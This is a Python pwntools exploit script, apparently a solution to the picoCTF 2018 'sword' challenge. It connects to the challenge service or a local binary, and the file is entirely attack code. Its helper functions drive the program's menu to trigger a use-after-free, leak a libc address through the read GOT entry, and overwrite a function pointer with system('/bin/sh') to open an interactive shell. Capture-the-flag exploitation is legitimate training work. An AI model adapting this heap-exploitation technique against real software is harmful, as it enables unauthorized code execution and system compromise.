from pwn import *
import sys

if '--local' in sys.argv:
	r = process(['./sword'])
	offset___libc_start_main_ret = 0x22b17
	offset_system = 0x00000000000435d0
	offset_dup2 = 0x00000000000e9af0
	offset_read = 0x00000000000e91c0
	offset_write = 0x00000000000e9290
	offset_str_bin_sh = 0x17f573
else:
	r = remote('2018shell1.picoctf.com', 43469)
	offset___libc_start_main_ret = 0x20830
	offset_system = 0x0000000000045390
	offset_dup2 = 0x00000000000f7970
	offset_read = 0x00000000000f7250
	offset_write = 0x00000000000f72b0
	offset_str_bin_sh = 0x18cd57

MENU_PROMPT = '7. Quit.\n'
IDX1_PROMPT = 'What\'s the index of the first sword?\n'
IDX2_PROMPT = 'What\'s the index of the second sword?\n'
IDX_PROMPT = 'What\'s the index of the sword?\n'

NAME_LENGTH_PROMPT = 'What\'s the length of the sword name?\n'
NAME_PROMPT = 'Plz input the sword name.\n'
WEIGHT_PROMPT = 'What\'s the weight of the sword?\n'

read_got = 0x602040

def forge():
	r.sendlineafter(MENU_PROMPT, '1')
	r.recvuntil('New sword is forged ^_^. sword index is ')
	return int(r.recvuntil('.')[:-1])

def syntesize(idx1, idx2):
	r.sendlineafter(MENU_PROMPT, '2')
	r.sendlineafter(IDX1_PROMPT, str(idx1))
	r.sendlineafter(IDX2_PROMPT, str(idx2))
	r.recvline()
	r.recvline()

def show(idx):
	ret = []
	r.sendlineafter(MENU_PROMPT, '3')
	r.sendlineafter(IDX_PROMPT, str(idx))
	r.recvuntil('The weight is ')
	ret.append(int(r.recvline()))
	r.recvuntil('The name is ')
	ret.append(r.recvline()[:-1])
	print 'berat', ret[0]
	print 'nama', ret[1]
	# log.info(ret[0])
	return ret

def destroy(idx):
	r.sendlineafter(MENU_PROMPT, '4')
	r.sendlineafter(IDX_PROMPT, str(idx))

def harden(idx, name):
	r.sendlineafter(MENU_PROMPT, '5')
	r.sendlineafter(IDX_PROMPT, str(idx))
	print 'panjang malloc', name.__len__()
	r.sendlineafter(NAME_LENGTH_PROMPT, str(name.__len__()))
	r.sendlineafter(NAME_PROMPT, name)
	r.sendlineafter(WEIGHT_PROMPT, '-1')

def equip(idx):
	r.sendlineafter(MENU_PROMPT, '6')
	r.sendlineafter(IDX_PROMPT, str(idx))
	r.recvline()

def leak_libc():
	idx1 = forge()
	harden(idx1, p32(11) + p32(5) + p64(read_got) + p64(0) + p64(0)[:-1])
	destroy(idx1)
	idx2 = forge()
	global libc_base
	libc_base = u64(show(idx2)[1].ljust(8, '\x00')) - offset_read
	log.info('libc base: ' + hex(libc_base))
	# r.interactive()


def serang():
	system = libc_base + offset_system
	str_bin_sh = libc_base + offset_str_bin_sh
	idx1 = forge()
	harden(idx1, p32(11) + p32(5) + p64(str_bin_sh) + p64(system) + p64(0)[:-1])
	destroy(idx1)
	idx2 = forge()
	log.info('dapet index: ' + str(idx2))
	equip(idx2)
	log.info('shell spawned')
	r.interactive()

if __name__ == '__main__':
	# destroy(forge())
	# destroy(forge())
	# destroy(forge())
	# destroy(forge())
	# destroy(forge())
	leak_libc()
	serang()
